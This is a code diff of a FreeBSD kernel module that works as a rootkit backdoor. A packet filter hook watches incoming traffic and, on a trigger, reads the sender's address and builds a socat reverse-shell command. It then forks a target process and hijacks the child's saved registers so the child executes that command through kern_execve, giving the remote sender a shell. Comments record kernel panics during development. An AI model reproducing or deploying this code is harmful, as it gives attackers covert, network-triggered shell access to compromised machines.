@@ -26,11 +26,13 @@
 #include <sys/sched.h>    // Needed for FIRST_THREAD_IN_PROC()
 #include <sys/unistd.h> // for RFPROC
 #include <sys/imgact.h> // For image_args
+
 #include <amd64/include/pcb.h> // for pcb struct
 // all the retarded includes for pcb
 #include <amd64/include/fpu.h>
 #include <amd64/include/segments.h>
 #include <amd64/include/tss.h>
+
 // for curenthread
 #include <sys/pcpu.h>
 
@@ -44,7 +46,6 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 #define TARGET_PROC "apeshit"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
-bool trying_to_make_rev_shell;
 // Define stack protection so we can use snprintf
 // Define the stack protector guard
 uintptr_t __stack_chk_guard = 0xDEADBEEFCAFEBABE;
@@ -53,13 +54,10 @@ static void __stack_chk_fail(void) {
     panic("Kernel stack smashing detected!");
 }
 
-
-
-
-
 /*
 custom exec_copyin_args that won't break
 */
+
 static int custom_copin_args_for_exec(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv) {
     u_long arg, env;
     int error;
@@ -123,8 +121,6 @@ static int custom_copin_args_for_exec(struct image_args *args, const char *fname
     return (error);
 }
 
-
-
 /*
 custom func to call exec shit
 */
@@ -132,12 +128,11 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
 
     struct image_args args;
     int error;
-    trying_to_make_rev_shell = false;
     // Define command and arguments: /bin/sh -c "echo hello"
     char *argv[] = { "/bin/sh", "-c", reverse_shell_cmd, NULL };
     char *envp[] = { "PATH=/bin:/usr/bin", NULL };  // Basic environment
 
-    // correct signature
+        // correct signature
 
     error = custom_copin_args_for_exec(&args, argv[0], UIO_SYSSPACE, (char**)&argv, (char**)&envp);
 
@@ -150,6 +145,7 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
     struct thread *curr_td = curthread;  // Macro to get current thread
     printf("Current thread ID: %d\n", curr_td->td_tid);
 
+
     error = kern_execve(curr_td, &args, NULL, NULL);
     if (error != 0) {
         printf("[LKM] kern_execve returned: %d\n", error);
@@ -158,11 +154,11 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
 }
 
 
-
 /*
  * Start of hooking fork and shoving my big fat juicy execve in there
  * Custom func that will be invoked whenever do_fork() is invoked
 */
+
 static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int flags) {
 
     if (strcmp(parent->p_comm, TARGET_PROC) != 0) {
@@ -170,41 +166,48 @@ static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int
         return;
     }
 
-    if (trying_to_make_rev_shell) {
-        struct thread *child_td;
+    struct thread *child_td;
 
-        child_td = FIRST_THREAD_IN_PROC(child);
-        if (child_td == NULL) {
-            printf("[LKM] Failed to get first thread of child process!\n");
-            return;
-        }
-    
-        struct pcb *pcb2;
-        // Get the PCB (Process Control Block) of the child thread 
-        pcb2 = child_td->td_pcb;
-        if (pcb2 == NULL) {
-            printf("[DEBUG] PCB is NULL, cannot modify it.\n");
-            return;
-        }
-        // hijack pcb_r12 to point from fork_trampoline to kern_execve()
-        pcb2->pcb_r12 = (register_t)custom_forkret_to_execve;
+    child_td = FIRST_THREAD_IN_PROC(child);
+    if (child_td == NULL) {
+        printf("[LKM] Failed to get first thread of child process!\n");
+        return;
     }
 
+    // this is the right way to do it but it wayyyyy complicated
+    // hijack pcb_rip to point from fork_trampoline to kern_execve()
+    struct pcb *pcb2;
+    // Get the PCB (Process Control Block) of the child thread 
+    // struct pcb *pcb2 = p2->p_threads.td_pcb; chat alos gave this line idk why its different
+    pcb2 = child_td->td_pcb;
+    if (pcb2 == NULL) {
+        printf("[DEBUG] PCB is NULL, cannot modify it.\n");
+        return;
+    }
+
+    // this line is causing a kernel panic
+    // this line is causing a kernel panic
+    // this line is causing a kernel panic
+    // we are going to try and do a full fork stack setting this func up correctly
+    // pcb2->pcb_rip = (register_t)func_pcbrip_points_to;
+
+    // testing if its the modification
+    pcb2->pcb_r12 = (register_t)custom_forkret_to_execve;
+
+
+
+
 }
-
-
 
 // used to register our func to the kernel
 static eventhandler_tag my_fork_tag;
 // registers custom func to kernel
 // EVENTHANDLER_DIRECT_INVOKE(process_fork, p1, p2, fr->fr_flags);
+// The above line invokes process_fork and below we register to process_fork
 static void load_custom_fork_event_handler(void) {
     my_fork_tag = EVENTHANDLER_REGISTER(process_fork, my_fork_hook, NULL, EVENTHANDLER_PRI_ANY);
     printf("[LKM] process_fork handler registered!\n");
 }
-
-
-
 // unregisters custom func to kernel
 static void unload_custom_fork_event_handler(void) {
     if (my_fork_tag != NULL)
@@ -215,25 +218,23 @@ static void unload_custom_fork_event_handler(void) {
 
 
 
-            static struct proc *find_process_by_name(const char *name) {
-                struct proc *p;
+    static struct proc *find_process_by_name(const char *name) {
+        struct proc *p;
 
-                sx_slock(&allproc_lock);  // Lock process list
-                LIST_FOREACH(p, &allproc, p_list) {
-                    PROC_LOCK(p);
-                    if (strcmp(p->p_comm, name) == 0) {
-                        PROC_UNLOCK(p);
-                        sx_sunlock(&allproc_lock);
-                        return p;  // Return first found instance
-                    }
-                    PROC_UNLOCK(p);
-                }
+        sx_slock(&allproc_lock);  // Lock process list
+        LIST_FOREACH(p, &allproc, p_list) {
+            PROC_LOCK(p);
+            if (strcmp(p->p_comm, name) == 0) {
+                PROC_UNLOCK(p);
                 sx_sunlock(&allproc_lock);
-
-                return NULL;  // No matching process found
+                return p;  // Return first found instance
             }
+            PROC_UNLOCK(p);
+        }
+        sx_sunlock(&allproc_lock);
 
-
+        return NULL;  // No matching process found
+    }
 
 /*
  * Start of custom packet filtering
@@ -246,9 +247,6 @@ static pfil_hook_t g_hook  = NULL;
 static inline int m_pullup_needed(struct mbuf *m, int needed_len) {
     return (m->m_len < needed_len) || ((m->m_next != NULL) && (m->m_pkthdr.len < needed_len));
 }
-
-
-
 // Additional custom packet filter
 static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
     struct mbuf *m = *mp;
@@ -302,17 +300,16 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
         (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
         (ntohl(ip_header->ip_src.s_addr)) & 0xFF);
-    
+
     printf("Kernel IP Address: %s\n", attacker_ip_str);
 
-    // Construct the reverse shell command
 
     // make this gloabl
     // char reverse_shell_cmd[100];
     snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
        "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, TRIGGER_PORT);
-       
-   
+
+
     printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
 
@@ -340,7 +337,6 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         fr.fr_procp = &new_proc;
 
         // Fork from the found process
-        trying_to_make_rev_shell = true;
         error = fork1(parent_td, &fr);
         if (error) {
             printf("[LKM] Fork failed: %d\n", error);
@@ -452,6 +448,3 @@ static moduledata_t module_data = {
     event_handler,
     NULL
 };
-
-
-DECLARE_MODULE(reverse_shell_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
